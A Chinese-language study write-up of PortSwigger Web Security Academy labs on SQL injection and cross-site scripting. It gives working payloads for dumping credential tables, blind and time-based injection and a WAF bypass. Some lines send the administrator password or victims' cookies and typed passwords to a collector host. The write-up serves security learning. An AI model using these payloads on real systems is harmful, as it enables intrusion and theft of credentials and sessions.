# SQL injection

## 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> 最基础的SQL注入，由于题目中已经告诉了语句格式，即告诉了`category`字段为单引号闭合，实际测试中可能需要花费一定时间去判断*脆弱字段*和*闭合形式*。

随便选择一个类别，然后修改类别名为不存在的名称，例如`abc`，然后进行单引号闭合，加入OR语句`or 1=1`，最后进行注释`--+`以使SQL语句成立，最后请求URL即为`https://xxxxxxx.web-security-academy.net/filter?category=abc'%20or%201%3D1--+`。

## 2: SQL injection vulnerability allowing login bypass

> 也是基础的SQL注入，题目要求登录`administrator`用户，那么用户名输入`administrator' --+`即可。实际中，可能需要测试一下闭合形式，我最开始是没有单引号的，发现失败了，就结合上一题（信息收集）测试一下单引号即可。

点击`My Account`进入登陆界面，用户名输入`administrator' --+`，密码任意输入（防止有检测空密码的JavaScript代码阻止登录），最后请求包数据为`csrf=xxxxxxx&username=administrator%27%20--%2B&password=administrator`

## 3: SQL injection attack, querying the database type and version on Oracle

> 基本的思路就是`union`一个查询数据库版本的语句，然后让其回显。

由于我对Oracle的语句并不熟悉，所以我参考了[一些资料](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

通过`' and 1=1--+`和`' and 1=2--+`确定是单引号闭合之后，就可以开始判断当前表的列数。

第一步需要判断当前表的列数（因为这关乎我们之后select语句返回数据的数量），可以通过`order by`语句进行测试，会发现`order by 3`时会报错，`order by 2`时正常，那么可以判断当前表有两列，即`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+order+by+2--+`。

接下来就可以开始使用`union`语句确定回显。在MySQL中，我们可以通过`select 1,2`的语句进行测试回显，但在Oracle中，必须要包含`from table`，所以我们使用`select '1','2' from dual`来进行测试（需要使用字符串而非数字，具体原因我不太清楚，之后如果系统了解Oracle应该会涉及）。*dual是Oracle的一个实际存在的表，常用在没有目标表的select语句中*。请求URL为`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+%271%27,%272%27+from+dual--+`，我们会发现两部分都会回显。

通过资料可以发现，Oracle中查询版本的语句为`SELECT banner FROM v$version`和`SELECT version FROM v$instance
`，我们以前者为例子，直接修改之前的select语句即可，例如`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+null,banner+from+v$version--+`，这里的`null`可以换成`%271%27`或直接`banner`。

## 4: SQL injection attack, querying the database type and version on MySQL and Microsoft

> 与上一个一样，不过就是后端不一样，换一些语法就可以了。

`https://xxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+1,@@version--+`

你也可以使用`version()`来替代`@@version`，这是我在下一个Lab中发现的，`version()`适用于所有非Oracle的数据库，但`@@version`仅适用于MySQL和Microsoft。

## 5: SQL injection attack, listing the database contents on non-Oracle databases

> 可以先通过注入查询数据库得到用户名密码，最后再登录。

可以通过`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+%271%27,version()--+`来进行初步测试，确定后端为`PostgreSQL`。

同样使用[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)中的Payload，我们可以通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,table_name+from+information_schema.tables--+`查看数据库表名，使用`ABC`这个不存在的category是为了去掉原本正常的数据。

搜索关键字`user`，挑选一个可能性较大的表，例如`pg_user`，通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,column_name+from+information_schema.columns+where+table_name=%27pg_user%27--+`查询其列名，会发现有`usename`和`passwd`两列。

最后通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+usename,passwd+from+pg_user--+`，但是发现这里只有两个用户`peter`和`postgres`，所以我们表找错了。最后再查看一次所有表，觉得`users_alyjev`可能也较大，进行查询后得到用户名密码，登录即可。

## 6: SQL injection attack, listing the database contents on Oracle

> 思路与上一个Lab一样，不过后端是Oracle。

通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,table_name+from+all_tables--+`查询所有表名，我们先选择`USERS_VSCHVE`这个表进行查询`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,column_name+from+all_tab_columns+where+table_name=%27USERS_VSCHVE%27--+`，然后查询用户名密码`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+USERNAME_LBWZOB,PASSWORD_JXBWPH+from+USERS_VSCHVE--+`，最后登录即可。

## 7: SQL injection UNION attack, determining the number of columns returned by the query

> 关键点在于通过`order by`判断有几列，然后根据题目要求添加一行空数据即可。

`https://xxxxxxx.web-security-academy.net/filter?category=Pets%27%20order%20by%203--+`

`https://xxxxxxx.web-security-academy.net/filter?category=Pets%27union+select+null,null,null--+`

## 8: SQL injection UNION attack, finding a column containing text

> 确定回显点为第二列之后，就可以在回显处完成输出`7ix1eZ`。

`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,%277ix1eZ%27,%273%27--+`

## 9: SQL injection UNION attack, retrieving data from other tables

> 跟第5个lab几乎一致。

## 10: SQL injection UNION attack, retrieving multiple values in a single column

> 这个题与之前获取用户名密码的不一样在于，它只有一个回显点，所以我们不能直接同时获取到所有的用户名与密码。

如果我们只想要获取`administrator`账户的密码，我们只需要利用`where`添加一个条件即可，`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,password+from+users+where+username=%27administrator%27--+`。

但这题的本意是使用拼接，将用户名和密码作为一个column回显，这样我们就可以得到所有的用户名和密码，`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,username||%27|%27||password+from+users--+`，我们可以得到只用`|`拼接用户名和密码的字段。这里需要注意我们不可以使用`&`进行拼接，因为`&`在URL用于连接不同参数。

## 11: Blind SQL injection with conditional responses

> 注入点在Cookie中的`TrackingId`字段，且为盲注。

通过BurpSuite抓包，在`TrackingId`字段后分别添加`' and '1'='1`和`' and '1'='2`，可以确定闭合形式为单引号，同时可以注意到请求成功与否的区别在于是否有`Welcome back!`字符串，这可以作为我们盲注的判断依据。

原本打算使用python写一个脚本（事实上我之前写过，应该也不是很难），但发现事实上发现可以使用BurpSuite来遍历从而实现盲注。使用python脚本有一些其他好处，例如可以二分查找，记录结果，在需要爆破库名时很有效。

通过添加`' and (select '1' from users limit 1)='1`来确定存在`users`表（题目中的信息，实际情况中可能需要进行表名的盲注）。

通过添加`' and (select '1' from users where username='administrator')='1`确定存在`administrator`用户。

通过添加`' and (select '1' from users where username='administrator' and length(password)>1)='1`，确定返回中有`Welcome back!`字符串后，使用intruder对长度进行爆破，得到密码长度为20。

然后对密码进行爆破，通过添加`' and (select substring(password,1,1) from users where username='administrator')='1`，我们可以使用`Cluster bomb`，同时遍历`substring`的index和盲注字符。

在这里，我们可以直接对密码进行爆破，但实际环境中，我们需要一次对数据库名、表数量、表名、列数量、列名进行盲注，同时在最后对密码进行爆破时，也不可以使用类似于`Cluster bomb`的方式，我们可能需要利用二分查找等方式尽可能的减少请求次数，以规避将网站测试垮或自身访问被限制等风险。

## 12: Blind SQL injection with conditional errors

> 报错相关的注入我确实不太了解，跟着官方的solution做一遍学习学习。

1. `TrackingId=xyz'`: 发现返回`500 Internal Server Error`。
2. `TrackingId=xyz''`: 发现返回`200 OK`，网页也正常陈列商品。
3. `TrackingId=xyz'||(select '' from dual)||'` 或 `TrackingId=xyz'||(select '')||'`: 根据是否报错判断数据库类型，此为Oracle。
4. `TrackingId=xyz'||(select '' from not-a-real-table)||'`: 此时可以发现返回报错，这是我们就可以在中间这个语句加入一定条件判断从而进行盲注，常见报错条件例如`to_char(1/0)`。
5. `TrackingId=xyz'||(select '' from users where rownum=1)||'`: 确定存在表`users`，需要注意的是*Oracle中没有`limit`，而使用`rownum`来控制查询区间。
6. `TrackingId=xyz'||(select case when (1=1) then '' else to_char(1/0)  end from dual)||'` 与 `TrackingId=xyz'||(select case when (1=1) then '' else to_char(1/0) end from dual)||'`: 通过是否报错确定盲注语句正确。
7. `'||(select case when (1=1) then '' else to_char(1/0) end from users where username='administrator')||'` 与 `'||(select case when (length(password)>1) then '' else to_char(1/0) end from users where username='administrator')||'`: 确定`administrator`用户并使用intruder盲注密码长度。
8. 进行密码盲注。

## 13: Visible error-based SQL injection

> 报错信息可见时，很多都比较方便。这里利用`cast()`函数直接将数据暴露出来。当然你也可以根据是否报错与上一题一样来解决，但既然有报错信息，那我们就可以利用这个信息显示直接暴露数据。

1. `' and cast((select 1) as int)--` 与 `' and cast((select 1) as int)=1--`: 可以得到`500 Internal Server Error`与报错`ERROR: argument of AND must be type boolean, not type integer`与正常网页，可以确定有报错回显。
2. `' and cast((select username from users) as int)=1--`: 你会得到报错`Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'xMV6MCazpBFu8ng4' and cast((select username from users) as i'. Expected  char`，这意味着后端进行了截取处理，我们需要缩短请求的数据，考虑到我们在试图使其进行报错，我们可以直接在TrackingId上动手脚，例如直接删掉或缩短为几个字符。
3. `' and cast((select username from users limit 1) as int)=1--`: 报错`ERROR: invalid input syntax for type integer: "administrator"`中可以泄漏数据`administrator`，如果第一个数据不是`administrator`的话，可以考虑使用`limit 2,1`和`offset`等语法，不过我尝试后得到`limit #,# syntax is not supported`，使用`offset`显然会超过字符数限制。
4. `' and cast((select password from users limit 1) as int)=1--`: 可以从报错`ERROR: invalid input syntax for type integer: "hvhf525whwj4k8uvhjny"`中提取密码。

## 14: Blind SQL injection with time delays

> 什么信息都没有的时候可以使用延时盲注。

需要注意的就是，一些不同后端sleep函数名不太一样，这里是PostgreSQL，需要使用`pg_sleep`，即在`TrackingId`字段后添加`'||pg_sleep(10)--`。

## 15: Blind SQL injection with time delays and information retrieval

> 对延时函数增加一些条件来进行对数据的猜测。需要注意的是，一般情况下我们选择将正确的情况进行延时，错误的情况不延时，因为大多数情况一定是猜解错误的，即`if true then sleep else nothing end`。

这里同时使用了堆叠注入，即在原本的语句后用`;`隔开再拼接一个语句。

1. 在`TrackingId`后添加`'%3bselect case when (1=1) then pg_sleep(5) else pg_sleep(0) end--`，其中`%3b`即为`;`，修改条件后确定盲注语句没有问题。
2. `'%3bselect case when (select username='administrator') then pg_sleep(5) else pg_sleep(0) end from users--`: 确定存在`administrator`用户。
3. `'%3bselect case when (select username='administrator' and length(password)>1) then pg_sleep(5) else pg_sleep(0) end from users--`: 对密码长度进行爆破。
   + 这里爆破长度时可以将是否延时调换一下，因为对密码长度的猜测是从小到大，前面一定为真，后面一定为假，这样前面等待时间会短一点。
4. 对密码进行爆破。
   + 在BurpSuite中爆破时，intruder monitor默认不会显示响应时间，在菜单栏`Columns`中将其打开。

## 16: Blind SQL injection with out-of-band interaction

使用Burp Collector请求一个域名，然后根据[Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)中的DNS lookup语句进行尝试，由于不确定后端，所以都试一遍就可以了，需要注意的是，里面许多字符在cookie中是保留的，例如`;`，我们需要将这些字符进行URL编码，最终payload为`' union select extractvalue(xmltype('<%3fxml version%3d"1.0" encoding%3d"UTF-8"%3f><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http%3a//collector.domain/"> %25remote%3b]>'),'/l') from dual--`。

此外我这里尝试了堆叠注入而非联合注入，但是好像是失败了。

## 17: Blind SQL injection with out-of-band data exfiltration

> 在上一题的基础上请求密码并将其拼接进URL，这里需要注意加`.`使得密码作为子域名。另外注意单引号和双引号的严格使用，具体原因我也不太懂。

`' union select extractvalue(xmltype('<%3fxml version%3d"1.0" encoding%3d"UTF-8"%3f><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http%3a//'||(select password from users where username%3d'administrator')||'.collector.domain/"> %25remote%3b]>'),'/l') from dual--`

## 18: SQL injection with filter bypass via XML encoding

WAF会检测SQL注入，在商品界面进行Check stock时，会有一个数据以xml形式传递的POST包，可以对xml字段进行注入，但简单尝试后会发现存在WAF。

对于xml，可以在注入的地方加入`<@/hex_entities><@/hex_entities>`来包裹住payload，以绕过WAF，即`<storeId><@hex_entities>-1 union select password from users where username='administrator'<@/hex_entities></storeId>`。

# Cross-site scripting

## 1. Reflected XSS into HTML context with nothing encoded

根据题目描述，在搜索处存在XSS，那就输入一个`test`尝试一下，发现前端页面有`<h1>0 search results for 'test'</h1>`，直接将请求中的test改成`<img src=x onerror=alert('test')>`即可。官方提供的payload为`<script>alert(1)</script>`。

## 2. Stored XSS into HTML context with nothing encoded

根据题目描述，在评论处存在XSS，直接查看之前评论的格式，被`<p>`包裹，直接评论`<img src=x onerror=alert(1)>`即可。

## 3. DOM XSS in `document.write` sink using source `location.search`

> 通过这题，我们可以将`document.write`作为DOM XSS的一个特征，在之后挖掘过程中可以作为一个关键字直接进行搜索。
>
> DOM XSS 主要是闭合DOM元素来实现XSS。

根据题目描述，直接搜索`document.write`定位到函数`trackSearch`：

```html
<script>
  function trackSearch(query) {
	  document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
  }
  var query = (new URLSearchParams(window.location.search)).get('search');
  if(query) {
  	trackSearch(query);
  }
</script>
```

在console中查看`window.location.search`的值或`new URLSearchParams(window.location.search).get('search')`的值，可以发现`query`即为我们搜索框输入的内容。同时发现对应的元素为`<img src="/resources/images/tracker.gif?searchTerms=test">`。我们先输入`">`进行闭合，然后构造新元素`<img src=x onerror="alert(1)`与之后的`">`形成闭合。或者后面的payload直接写完整的再加上注释`<img src=x onerror=alert(1)>\\`，或者不加注释直接写payload，这样后面多余的`">`就会被解析成字符，官方解法就是如此。

官方解法给的payload为`"><svg onload=alert(1)>`。

## 4. DOM XSS in `innerHTML` sink using source `location.search`

> 通过这题，我们的DOM XSS特征又多了一个`innerHTML`。

同第3题一样，我们可以定位到相关的代码：

```html
<section class=blog-header>
  <h1><span>2 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
  <script>
    function doSearchQuery(query) {
      document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
      doSearchQuery(query);
    }
  </script>
  <hr>
</section>
```

可以看到对于我们可以控制的字符串来说，是用`<span></span>`进行闭合的，payload与上一题保持一致即可。payload：`</span><img src=x onerror=alert(1)>`。

官方给的payload为`<img src=1 onerror=alert(1)>`，看上去`<img>`是可以包含在`<span></span>`中的。

## 5. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

> 根据题目的描述 *It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`*，`$('#link').attr("href", something);`也可以作为一个特征。

先定位代码：

```html
<form id="feedbackForm" action="/feedback/submit" method="POST" enctype="application/x-www-form-urlencoded">
  <input required type="hidden" name="csrf" value="N5I35lWKgbePgTuN6OGyvxQGnGI7IjjX">
  <label>Name:</label>
  <input required type="text" name="name">
  <label>Email:</label>
  <input required type="email" name="email">
  <label>Subject:</label>
  <input required type="text" name="subject">
  <label>Message:</label>
  <textarea required rows="12" cols="300" name="message"></textarea>
  <button class="button" type="submit">
    Submit feedback
  </button>
  <span id="feedbackResult"></span>
  <script src="/resources/js/jquery_1-8-2.js"></script>
  <div class="is-linkback">
    <a id="backLink">Back</a>
  </div>
  <script>
    $(function() {
      $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
  </script>
</form>
```

同时确定修改的元素`<a id="backLink" href="/">Back</a>`。由以上信息我们理清了代码逻辑，url中的`returnPath`参数会被替换为`Back`按钮的返回链接，即`href`属性，我们可以通过闭合双引号来实现，也可以直接通过`javascript:alert(1)`来实现。

官方给的解法是直接用`javascript:alert(document.cookie)`，我没能实现用闭合双引号的解法，但可以作为一种思路。

## 6. DOM XSS in jQuery selector sink using a hashchange event

> 这题利用<iframe>元素来调用`print()`函数，这个算是我的知识盲区了，正好学习一下。

直接在exploit server的body里添加payload `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`，然后deliver即可。

## 7. Reflected XSS into attribute with angle brackets HTML-encoded

我尝试了对标签进行闭合的方式，不过最后失败了。官方给的payload是`"onmouseover="alert(1)`，经过观察可以发现，对于我们输入的test一共有两个地方有回显（我们称作reflection），但我只观察到`<h1>`标签对应的可以直接看到的信息，没有在Developer Tools里进行搜索，错失了第二个看不到的对应搜索框`<input>`标签属性的一个reflection。对于`<input>`标签，有`onmouseover`**事件**可以执行脚本，这样我们可以对`"`闭合然后进行xss注入，同理我们可以想到别的payload：`"onfocus="alert(1)`。

## 8. Stored XSS into anchor `href` attribute with double quotes HTML-encoded

找了半天没找到哪里有`href`让我注入，看了官方解法才知道评论的时候输入`website`才行，这提醒我们测试功能点的时候要一个不漏。接下来跟第5题就一样了，`javascript:alert(1)`即可。

## 9. Reflected XSS into a JavaScript string with angle brackets HTML encoded

与往常一样进行搜索，可以看到我们可以直接影响脚本代码：

```html
<script>
  var searchTerms = 'test';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

尝试闭合`'`，成功：`';alert(1);var a='1`或者`';alert(1);//`。

官方题解给的payload是`'-alert(1)-'`，是将单引号闭合之后，由于我们影响的是一个变量，可以利用加减乘除等操作，js需要先执行每一个运算数，才执行加减乘除，这个思路也可以学一下。

## 10. DOM XSS in document.write sink using source location.search inside a select element

搜索定位到商品详情页的html中有脚本来生成`<select>`列表，可以通过`storeId`参数来添加自定义选项，我们只需要传入`storeId=<script>alert(1)</script>`即可。

官方给的payload为`product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>`，对`<select>` 进行了闭合。

## 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

> 纯不知道，纯学习。

官方payload：`{{$on.constructor('alert(1)')()}}`

参考资料：https://stackoverflow.com/questions/72637416/what-does-on-constructor-do-in-angularjs，不过回答里最后给的等价形式有些问题，应该是等价于`function(){alert(1);}()`。

## 12. Reflected DOM XSS

没有能做出来这题，直接记录官方的思路。

随便输入抓包，可以发现返回值以JSON形式返回，且最后一个键值对为`"searchTerm":"test"`，使用返回值的JavaScript代码为`eval('var searchResultsObj = ' + this.responseText);`。这些信息也可以通过下断点来获得。

这时，我们可以对双引号和花括号进行闭合，输入`test"-alert(1)}//`来进行XSS，但是会发现系统对`"`做了转义，所以我们需要使用`test\"-alert(1)}//`来进行XSS（系统并未对`\`进行转义，如果转义了就需要做出调整）。

同理，我们也可以有新的payload：`test\"};alert(1)//`。

## 13. Stored DOM XSS

XSS点在评论内容，我的payload：`</p><img src=x onerror=alert(1)>`，官方的payload为`<><img src=1 onerror=alert(1)>`，官方的解释说是用前置的`<>`来绕过`replace()`函数。事实上后端应该是用`replace()`函数来实现转义，我payload中`</p>`的`<`和`>`就被转义了，后面的`<img>`就没有被转义，所以成功逃逸。

**通过这两个DOM XSS可以看出，主要思路就是在传入后端的数据中，尝试闭合符合，注入payload，加入一些用来绕过后端函数的字符串，从而达到XSS在DOM中被执行的效果。**

## 14. Reflected XSS into HTML context with most tags and attributes blocked

 在搜索框中搜索`<img src=x onerror=alert(1)>`会得到返回`"Tag is not allowed"`。再往后我就没什么想法了，但其实要做的很简单，测试哪些tag可用哪些不可用。做法也很简单，利用BurpSuite的Intruder和官方的[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)中提供的所有tag，即可进行测试。

测试会发现只有`<body>`和`<custom tags>`可用。然后故技重施，测试所有可用的event来帮助我们触发`print()`函数。最后发现`onresize`、`onscrolled`、`onratechange`、`onbeforeinput`、`onbeforetoggle`可用，选择一个合理的构造payload即可，例如`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`，其中先对`""`和`<>`进行闭合。

如果没有`onload=this.style.width='100px'`会无法成功，因为这是在调整界面大小，即触发`onresize`的条件。

## 15. Reflected XSS into HTML context with all tags blocked except custom ones

官方payload如下：

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'
</script>
```

依然是`search`字段，构造一个custom tag为`xss`，`id=x`，event为`onfocus`，利用`location = 'https://xxx.xxx/#x'`的锚点定位到这一元素触发`onfocus`。`tabindex` 属性规定当使用tab键进行导航时元素的顺序，看上去是结合锚点一起才能触发`onfocus`。

## 16. Reflected XSS with some SVG markup allowed

这里测试一下哪些tag可以用，发现`svg`可以用，但`svg`的所有event都被block了。我们发现`animatetransform`是可以用的，所以结合两者，最终的payload为`<svg><animatetransform onbegin=alert(document.cookie)>`，`animatetransform`用来操作`svg`，然后触发`onbegin`。

## 17. Reflected XSS in canonical link tag

在`<head>`中有一个`<link rel="canonical" href=''/>`的标签来表示权威url的链接，参考资料：https://www.wbolt.com/what-is-canonical-url.html

对于一个标签，我们可以利用`accesskey`和`onclick`属性进行XSS（仅限于Chrome），参考链接：https://security.stackexchange.com/questions/175304/how-to-perform-xss-in-hidden-html-input-fields-using-accesskey

这里我们发现权威url的值即为我们访问的url，此时进行单引号闭合并添加属性即可。由于我们是在URL中动手脚，为了保证浏览器能够正常访问到该页面（靶场），我们需要使用`?`来分割原url和payload（在浏览器看来我们的payloud只是参数，但在解析时会造成XSS），最终payload为`https://xxxxxxx.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`，不使用`%20`来进行分割，因为`%20`不会被转义会空格，且不需要空格HTML也可以正常解析，实战中多尝试即可。

## 18. Reflected XSS into a JavaScript string with single quote and backslash escaped

> 画个重点，对于转义字符的绕过我觉得是比较重要的。
>
> 关键是backslash被转义，如果只是其他字符被转义可以尝试使用backslash进行逃逸。
>
> 另外可以注意single quote是被使用backslash进行转义还是使用了html编码转义。

这道题XSS漏洞的点在于“对字符进行了转义，但用户输入的变量会修改`<scrip></script>`的内容“，我们可以直接使用`</script>`进行闭合后添加新的脚本，最终payload为`</script><script>alert(1)</script>`。

## 19. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

> 在backslash没有被转义时，可以尝试使用backslash进行引号的逃逸，这里将`\`转义成了`\\`，但这不影响逃逸引号。

知道原理多看开发者工具就很容易得到payload：`test\'-alert(1);//`

## 20. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

这道题其实关键点都找对了，但是没能做出来。

先可以随意尝试，会发现必须要正常的web协议才可以，像`javascript:`伪协议是行不通的。之后Developer Tools中一搜会发现有`onclick`的脚本（标题也提示了其实），我的目标就转成了拼接单引号，即原本是`'http://test.com'`，变为`'http://test.com'-alert(1)-''`，即payload内容为`http://test.com'-alert(1)'`，但无法正常输入，因为单引号被转义成了`\'`。各种尝试之后看了官方solution，发现将`'`替换成`&apos;`即可。可能跟`tracker.track`也有关系吧。

官方payload给的是`http://test.com&apos;?-alert(1)&apos;`，这样有了`?`可以防止跳转过去url解析错误。但没有`?`也可以触发XSS漏洞。

## 21. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

看了半天没有能绕过，最后学到了新的语法：在`` ` ``中可以使用`${alert(1)}`来执行JavaScript语句。

## 22. Exploiting cross-site scripting to steal cookies

评论框没有做过滤，直接`<script>`就可以。

```html
<script>
  fetch(
    'https://BURP-COLLABORATOR-SUBDOMAIN', {
      method: 'POST',
      mode: 'no-cors',
      body:document.cookie
    });
</script>
```

直接`alert`也行，不过官方也说了，这样不够隐蔽。

最后替换Cookies打开My Account即可。

## 23. Exploiting cross-site scripting to capture passwords

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
	method:'POST',
	mode: 'no-cors',
	body:username.value+':'+this.value
});">
```

基本思路跟#22一样，就是通过`fetch`来请求Burp Collector获取信息，但是构造`input`是我没有想到的。

想要触发这个Payload，就需要在`input`中输入用户名和密码，这有两种可能：一为钓鱼，二为利用浏览器自动填充的特性。

在Community Solutions中，还有一种其他的解法，直接将用户名密码回显在评论区。

```html
<input type="text" name="username" id="username">
<input type="password" name="password" onchange="hax()">

<script>
function hax() {
  var token = document.getElementsByName("csrf")[0].value;
  var username = document.getElementsByName("username")[0].value;
  var password = document.getElementsByName("password")[0].value;
  
  var data = new FormData();
  data.append("csrf", token);
  data.append("postID", 1);
  data.append("comment", `${username}:${password}`);
  data.append("name", "victim");
  data.append("email", "victim@portswigger.net");
  data.append("website", "http://portswigger.net");
  
  fetch("/post/comment", {
    method: "POST",
    mode: "no-cors",
    body: data
  });
}
</script>
```

这样会在`postID`为`1`的文章评论中找到用户名和密码。但没有成功复现，通过debug会发现，`fetch`会返回`400`，可能是官方为了减少非预期解，毕竟是靶场。

## 24. Exploiting XSS to perform CSRF

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test%40test.com')
};
</script>
```

直接搬的官方payload，把`@`做了url encoding，防止报错，虽然不做也可以过。

就是新建一个请求，然后访问`/my-account`，然后记录CSRF Token，最后请求修改email即可。

但好像自己访问并不会修改email，同时我第二次用这个payload并没有成功solve这个lab，同样的，email也没有修改（第一次是solve了但是email没有修改）。这里应该有一些东西没有彻底搞明白。

## 25. Reflected XSS with AngularJS sandbox escape without strings

> 未解决

**参考资料**

https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection

https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs

因为没有系统学AngularJS和其相关的攻击方法，我直接来分析官方提供的Payload：`https://xxxxxxx.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`

靶场中的JS如下：

```html
<section class=blog-header>
  <script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
      $scope.query = {};
      var key = 'search';
      $scope.query[key] = 'Your input';
      $scope.value = $parse(key)($scope.query);
    });</script>
  <h1 ng-controller=vulnCtrl>0 search results for {{value}}</h1>
  <hr>
</section>
```

## 27. Reflected XSS with event handlers and href attributes blocked

测试了发现a标签不会被过滤，但是我用Intruder跑了XSS Cheat Sheet里的所有event，都不合法。无奈之下，只好看了payload：`<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>`，这个还是看懂了，只能说，太巧妙了。学到了。
